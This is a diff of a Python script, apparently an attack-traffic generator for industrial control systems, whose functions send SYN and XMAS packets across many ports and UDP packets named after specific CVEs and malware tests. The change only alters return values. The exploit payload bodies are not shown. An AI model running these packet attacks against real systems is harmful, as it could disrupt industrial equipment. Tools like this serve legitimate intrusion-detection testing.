@@ -1,6 +1,7 @@
 from scapy.all import *
 from pymodbus.client.sync import ModbusTcpClient
 from pymodbus.exceptions import *
+# import goose
 
 
 time_out = 2
@@ -82,14 +83,14 @@ def dos_syn(target):
     dst_port = (1, 3000)
     src_port = RandShort()
     sr1(IP(dst=target) / TCP(sport=src_port, dport=dst_port), timeout=1, verbose=0)
-    return ""
+    return "DONE"
 
 
 def dos_xmas(target):
     dst_port = (1, 3000)
     src_port = RandShort()
     sr1(IP(dst=target) / TCP(sport=src_port, dport=dst_port, flags="FPU"), timeout=1, verbose=0)
-    return ""
+    return "DONE"
 
 
 def malware_eicar(target):
@@ -104,7 +105,7 @@ def malware_eicar(target):
     sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
     sock.sendto(payload, (target, 1234))
     sock.close()
-    return ""
+    return "DONE"
 
 
 def malware_passwd(target):
@@ -127,7 +128,7 @@ def cve_2015_5374(target):
     sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
     sock.sendto(payload, (target, 50000))
     sock.close()
-    return ""
+    return "DONE"
 
 
 def cve_2014_0750(target):
@@ -155,7 +156,7 @@ def cve_2011_3486(target):
     sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
     sock.sendto(payload, (target, 48899))
     sock.close()
-    return ""
+    return "DONE"
 
 
 if __name__ == '__main__':
